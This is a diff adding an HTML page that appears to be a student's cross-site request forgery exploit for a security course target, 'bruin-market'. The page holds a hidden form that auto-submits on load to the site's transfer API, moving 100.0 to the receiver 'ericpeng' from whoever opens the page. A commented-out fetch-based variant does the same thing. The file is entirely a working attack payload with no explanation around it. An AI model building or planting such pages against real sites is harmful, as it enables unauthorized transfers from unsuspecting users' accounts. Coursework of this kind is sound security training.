@@ -1,0 +1,32 @@
+<html>
+  <body>
+    <form action="https://bruin-market.ece117.com/api/transfer" method="POST">
+      <input type="hidden" name="receiver" value="ericpeng" />
+      <input type="hidden" name="amount" value="100.0" />
+    </form>
+    
+    <script>
+      window.onload = function () {
+        document.forms[0].submit();
+      };
+      // hacker = document.getElementsByName("receiver")[0].value
+      // amount = document.getElementsByName("amount")[0].value
+    
+      // alert(hacker+" thank you for your "+amount+" dollars!")
+
+    //   data = {
+    //     receiver: hacker,
+    //     amount: amount,
+    //   }
+    //   fetch("https://bruin-market.ece117.com/api/transfer", {
+    //     method: "POST",
+    //     body: JSON.stringify(data),
+    //     headers: {
+    //         "Content-Type": "application/json",
+    //     },
+    //   }).then(response => response.text())
+    //     .then(data => console.log(data))
+    //     .catch(error => alert(error));
+    </script>
+  </body>
+</html>
